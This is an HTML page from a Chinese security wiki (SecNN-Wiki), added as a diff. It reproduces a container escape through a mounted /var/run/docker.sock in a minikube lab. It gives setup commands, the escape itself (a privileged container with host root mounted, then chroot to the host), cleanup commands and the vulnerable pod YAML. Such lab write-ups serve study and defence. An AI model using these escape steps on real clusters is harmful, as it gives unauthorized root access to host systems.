@@ -1,0 +1,226 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E6%8C%82%E8%BD%BD%20docker.sock%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>挂载 docker.sock 导致容器逃逸 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "\u6302\u8f7d docker.sock \u5bfc\u81f4\u5bb9\u5668\u9003\u9038", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+              {title: "\u73af\u5883\u590d\u539f", url: "#_4" },
+              {title: "YAML", url: "#yaml" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%8C%82%E8%BD%BD%20log%20%E7%9B%AE%E5%BD%95%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%8C%82%E8%BD%BD%20log%20%E7%9B%AE%E5%BD%95%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-link">
+        挂载 log 目录导致容器逃逸
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../VMware%20vCenter%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-21972/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../VMware%20vCenter%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-21972/" class="btn btn-xs btn-link">
+        VMware vCenter Server 远程代码执行漏洞 CVE-2021-21972
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="dockersock">挂载 docker.sock 导致容器逃逸<a class="headerlink" href="#dockersock" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>Docker Socket 是 Docker 守护进程监听的 Unix 域套接字，用来与守护进程通信——查询信息或下发命令。如果在攻击者可控的容器内挂载了该套接字文件（/var/run/docker.sock），可通过 Docker Socket 与 Docker 守护进程通信，发送命令创建并运行一个新的容器，将宿主机的根目录挂载到新创建的容器内部，完成简单逃逸。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/_GwGS0cVRmuWEetwMesauQ">https://mp.weixin.qq.com/s/_GwGS0cVRmuWEetwMesauQ</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>基础环境准备（Docker + Minikube + Kubernetes），可参考 <a href="https://github.com/Threekiii/Awesome-POC/blob/master/%E4%BA%91%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Kubernetes%20%2B%20Ubuntu%2018.04%20%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA.md">Kubernetes + Ubuntu 18.04 漏洞环境搭建</a> 完成。</p>
+<p>本例中各组件版本如下：</p>
+<div class="highlight"><pre><span></span><code>Docker version: 18.09.3
+minikube version: v1.35.0
+Kubectl Client Version: v1.32.3
+Kubectl Server Version: v1.32.0
+</code></pre></div>
+<p>通过 yaml 文件创建漏洞环境：</p>
+<div class="highlight"><pre><span></span><code>kubectl apply -f k8s_metarget_namespace.yaml
+kubectl apply -f mount-docker-sock.yaml
+</code></pre></div>
+<p>执行完成后，K8s 集群内 <code>metarget</code> 命名空间下将会创建一个名为 <code>mount-docker-sock</code> 的 pod，宿主机的 <code>/var/run/docker.sock</code> 被挂载在容器内部：</p>
+<div class="highlight"><pre><span></span><code>kubectl get pods -n metarget
+-----
+NAME                READY   STATUS    RESTARTS   AGE
+mount-docker-sock   1/1     Running   0          13s
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%20docker.sock%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250519172523152.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>通过以下两个步骤来完成简单逃逸：</p>
+<ol>
+<li>在容器内安装 Docker 命令行客户端</li>
+<li>使用容器内的客户端通过 Docker socket 与 Docker 守护进程通信，发送命令创建并运行一个挂载宿主机根目录的容器，实现基本逃逸。</li>
+</ol>
+<p>执行以下命令进入容器:</p>
+<div class="highlight"><pre><span></span><code>kubectl<span class="w"> </span><span class="nb">exec</span><span class="w"> </span>-n<span class="w"> </span>metarget<span class="w"> </span>-it<span class="w"> </span>mount-docker-sock<span class="w"> </span>--<span class="w"> </span>bash
+</code></pre></div>
+<p>在容器内安装 Docker 命令行客户端:</p>
+<div class="highlight"><pre><span></span><code># 先将源替换为中科大源
+sed -i &#39;s/archive.ubuntu.com/mirrors.ustc.edu.cn/g&#39; /etc/apt/sources.list
+apt update &amp;&amp; apt install -y wget
+
+# 然后下载编译好的 docker 客户端
+wget https://download.docker.com/linux/static/stable/x86_64/docker-17.03.0-ce.tgz
+tar xf ./docker-17.03.0-ce.tgz
+</code></pre></div>
+<p>成功安装 Docker 客户端:</p>
+<div class="highlight"><pre><span></span><code>root@mount-docker-sock:/# cd docker
+root@mount-docker-sock:/docker# ls
+docker  docker-containerd  docker-containerd-ctr  docker-containerd-shim  docker-init  docker-proxy  docker-runc  dockerd
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%20docker.sock%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250519173026494.png" /></p>
+<p>执行 docker 命令 <code>docker ps</code>，结果和宿主机相同，证实 docker.sock 挂载成功：</p>
+<div class="highlight"><pre><span></span><code>root@mount-docker-sock:/docker# ./docker ps
+CONTAINER ID        IMAGE                        COMMAND                  CREATED             STATUS              PORTS               NAMES
+abf602bae267        602eb6fb314b                 &quot;/bin/bash -c -- &#39;...&quot;   8 minutes ago       Up 8 minutes                            k8s_ubuntu_mount-docker-sock_metarget_75b4ad1b-0193-4008-b559-4dbd7d92cc3f_0
+b347f319bf8b        registry.k8s.io/pause:3.10   &quot;/pause&quot;                 8 minutes ago       Up 8 minutes                            k8s_POD_mount-docker-sock_metarget_75b4ad1b-0193-4008-b559-4dbd7d92cc3f_0
+...
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%20docker.sock%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250519173128232.png" /></p>
+<p>启动一个挂载宿主机根目录的特权容器，完成简单逃逸：</p>
+<div class="highlight"><pre><span></span><code>kubectl exec -n metarget -it mount-docker-sock -- bash
+root@mount-docker-sock:/# cd docker
+root@mount-docker-sock:/docker# ./docker run -it -v /:/host --privileged --name=sock-test ubuntu /bin/bash
+root@5b61ce1ed2ce:/# chroot /host
+# cat /etc/hostname
+minikube
+</code></pre></div>
+<p><img alt="" src="../images/%E6%8C%82%E8%BD%BD%20docker.sock%20%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/image-20250519180629556.png" /></p>
+<blockquote>
+<p>由于我们是在 minikube 上运行 kubernetes，这里逃逸到的是 minikube 虚拟机。</p>
+</blockquote>
+<h2 id="_4">环境复原<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>kubectl delete -f mount-docker-sock.yaml
+kubectl delete -f k8s_node_proxy.yaml
+</code></pre></div>
+<h2 id="yaml">YAML<a class="headerlink" href="#yaml" title="Permanent link">&para;</a></h2>
+<p><a href="https://github.com/Metarget/metarget/blob/master/vulns_cn/mounts/pods/mount-docker-sock.yaml">mount-docker-sock.yaml</a></p>
+<div class="highlight"><pre><span></span><code>apiVersion: v1
+kind: Pod
+metadata:
+  name: mount-docker-sock
+  namespace: metarget
+spec:
+  containers:
+  - name: ubuntu
+    image: ubuntu:latest
+    imagePullPolicy: IfNotPresent
+    # Just spin &amp; wait forever
+    command: [ &quot;/bin/bash&quot;, &quot;-c&quot;, &quot;--&quot; ]
+    args: [ &quot;while true; do sleep 30; done;&quot; ]
+    volumeMounts:
+    - name: docker-sock
+      mountPath: /var/run/docker.sock
+  volumes:
+    - name: docker-sock
+      hostPath:
+        path: /var/run/docker.sock
+</code></pre></div>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../%E6%8C%82%E8%BD%BD%20log%20%E7%9B%AE%E5%BD%95%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../%E6%8C%82%E8%BD%BD%20log%20%E7%9B%AE%E5%BD%95%E5%AF%BC%E8%87%B4%E5%AE%B9%E5%99%A8%E9%80%83%E9%80%B8/" class="btn btn-xs btn-link">
+        挂载 log 目录导致容器逃逸
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../VMware%20vCenter%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-21972/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../VMware%20vCenter%20Server%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20CVE-2021-21972/" class="btn btn-xs btn-link">
+        VMware vCenter Server 远程代码执行漏洞 CVE-2021-21972
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
